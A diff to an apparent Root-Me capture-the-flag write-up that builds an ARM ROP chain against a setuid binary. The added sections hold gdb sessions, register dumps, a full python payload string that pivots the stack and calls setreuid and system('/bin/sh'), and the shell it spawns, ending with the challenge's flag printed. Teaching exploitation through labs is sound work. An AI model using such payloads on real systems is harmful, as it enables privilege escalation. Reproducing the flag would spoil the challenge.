@@ -133,11 +133,12 @@ Before we'll start ropping, after disassembling the binary the following functio
    105a8:	e320f000 	nop	{0}
    105ac:	e24bd008 	sub	sp, fp, #8
    105b0:	e8bd8810 	pop	{r4, fp, pc}
+
 ```
 **system**! Let's use it.<br>
-So the plan is to overwrite the _lr_ value stored in the stack, store "/bin/sh" in a writeable address, set r0 and r1 to _app-systeme-ch46-cracked_ (1246), and jump to 0x10594 so the program will setreuid to a privileged user (reminder - suid is set) and run "/bin/sh" with **system**.<br>
+So the plan is to overwrite the _lr_ value stored in the stack, store "/bin/sh" in a writable address, set r0 and r1 to _app-systeme-ch46-cracked_ (1246), and jump to 0x10594 so the program will setreuid to a privileged user (reminder - suid is set) and run "/bin/sh" with **system**.<br>
 
-So first, let's write "/bin/sh" in a writeable address. According to the recon., the obvious place to store it is in the .data section - it has enough size (/bin/sh\x00 = 8 bytes).<br>
+So first, let's write "/bin/sh" in a writable address. According to the recon., the obvious place to store it is in the .data section - it has enough size (/bin/sh\x00 = 8 bytes).<br>
 So, let's take a look at instructions above the **scanf** function in the **main**. The buffer which will save the user's input is set in the instruction ```sub	r3, r11, #68	; 0x44```. Then r1 gets the address (```mov	r1, r3```) and afterward _r0_ will get the address for the "%s" format string.<br>
 So, let's set fp to 0x21044 and jump to there, so _r1_ will contain 0x21000 (the .data section).<br>
 
@@ -228,3 +229,95 @@ cpsr           0x60070010	1611071504
 0x21050:	0x000004de	0x43434343	0x44444444
 ```
 Now, we succeed to write "/bin/sh" to 0x21000, and set _r3_ and _r4_ to 1246 so _r1_ and _r0_ will be set to it, when we'll jump to call **setreuid**.<br>
+Techincally, we're ready to jump to **setreuid**. But, unfortunately the _sp_ is to low for the **system** function. That will cause the stack to reach an unwritable address. So, we'll have to change the _sp_ before we'll jump there.<br><br>
+
+According to ROPgadget, the ```sub sp, fp, #4 ; pop {fp, pc}``` is exactly what we need.<br>
+So, in the last jump in our payload, we'll need to set _fp_ to a high enough value, so _sp_ will be there as well. In addition, because the _sp_ is now changed, we'll need to fill the address until the new value to junk bytes, so we'll be able to retake control on the _fp_ and the _pc_.<br><br>
+
+After some tries:
+```gdb
+((gdb) run < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + '\xf8\x03\x01\x00' + '\xde\x04\x00\x00' + '\xb0\x05\x01\x00' + '\xde\x04\x00\x00' + '\x00\x13\x02\x00' + '\x80\x06\x01\x00' + 'A'*672 + 'CCCC' + 'DDDD'")
+Starting program: /challenge/app-systeme/ch46/ch46 < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + '\xf8\x03\x01\x00' + '\xde\x04\x00\x00' + '\xb0\x05\x01\x00' + '\xde\x04\x00\x00' + '\x00\x13\x02\x00' + '\x80\x06\x01\x00' + 'A'*672 + 'CCCC' + 'DDDD'")
+Cannot parse expression `.L1185 4@r4'.
+warning: Probes-based dynamic linker interface failed.
+Reverting to original interface.
+
+Give me data to dump:
+Payload is: 
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 44 10 02 
+Payload is: 
+2f 62 69 6e 2f 73 68 
+
+Program received signal SIGSEGV, Segmentation fault.
+0x44444444 in ?? ()
+(gdb) info registers
+r0             0x7	7
+r1             0x0	0
+r2             0x1	1
+r3             0x4de	1246
+r4             0x4de	1246
+r5             0x0	0
+r6             0x0	0
+r7             0x0	0
+r8             0x0	0
+r9             0x0	0
+r10            0xb6f00000	3069181952
+r11            0x43434343	1128481603
+r12            0x0	0
+sp             0x21304	0x21304
+lr             0xb6e3879b	-1226602597
+pc             0x44444444	0x44444444
+cpsr           0x60070010	1611071504
+```
+We're able to change the _sp_ to a higher address and retake the control of _fp_ and _pc_.<br>
+Now we're ready to jump to call the **setreuid**. <br>
+One last thing - before the **system** function call, _r0_ is set according to this instruction ```ldr	r0, [fp, #-16]```. So, we'll need to put 0x21000 in the stack, so _fp-16_ will point to it.<br>
+
+```gdb
+(gdb) run < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + '\xf8\x03\x01\x00' + '\xde\x04\x00\x00' + '\xb0\x05\x01\x00' + '\xde\x04\x00\x00' + '\x00\x13\x02\x00' + '\x80\x06\x01\x00' + 'A'*672 + '\x14\x13\x02\x00' + '\x94\x05\x01\x00' + '\x00\x10\x02\x00'")
+Starting program: /challenge/app-systeme/ch46/ch46 < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + '\xf8\x03\x01\x00' + '\xde\x04\x00\x00' + '\xb0\x05\x01\x00' + '\xde\x04\x00\x00' + '\x00\x13\x02\x00' + '\x80\x06\x01\x00' + 'A'*672 + '\x14\x13\x02\x00' + '\x94\x05\x01\x00' + '\x00\x10\x02\x00'")
+Cannot parse expression `.L1185 4@r4'.
+warning: Probes-based dynamic linker interface failed.
+Reverting to original interface.
+
+Give me data to dump:
+Payload is: 
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 44 10 02 
+Payload is: 
+2f 62 69 6e 2f 73 68 
+
+Breakpoint 1, 0x000105a4 in exec ()
+(gdb) info registers
+r0             0x21000	135168
+r1             0xb6f4f4c0	3069506752
+r2             0x10	16
+r3             0x1	1
+r4             0x4de	1246
+r5             0x0	0
+r6             0x0	0
+r7             0x0	0
+r8             0x0	0
+r9             0x0	0
+r10            0xb6f5a000	3069550592
+r11            0x21314	135956
+r12            0xcb	203
+sp             0x21304	0x21304
+lr             0xb6ed4175	-1225965195
+pc             0x105a4	0x105a4 <exec+48>
+cpsr           0x70010	458768
+```
+Awesome! So the payload is ready. Let's give it a try outside gdb.<br><br>
+
+```sh
+app-systeme-ch46@challenge04:~$ cat <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + '\xf8\x03\x01\x00' + '\xde\x04\x00\x00' + '\xb0\x05\x01\x00' + '\xde\x04\x00\x00' + '\x00\x13\x02\x00' + '\x80\x06\x01\x00' + 'A'*672 + '\x14\x13\x02\x00' + '\x94\x05\x01\x00' + '\x00\x10\x02\x00'") - | ./ch46 
+Give me data to dump:
+Payload is: 
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 44 10 02 
+Payload is: 
+2f 62 69 6e 2f 73 68 
+id
+uid=1246(app-systeme-ch46-cracked) gid=1146(app-systeme-ch46) groups=1146(app-systeme-ch46),100(users)
+cat .passwd
+ARM_b4by_ROP_to_warm_up
+```
+
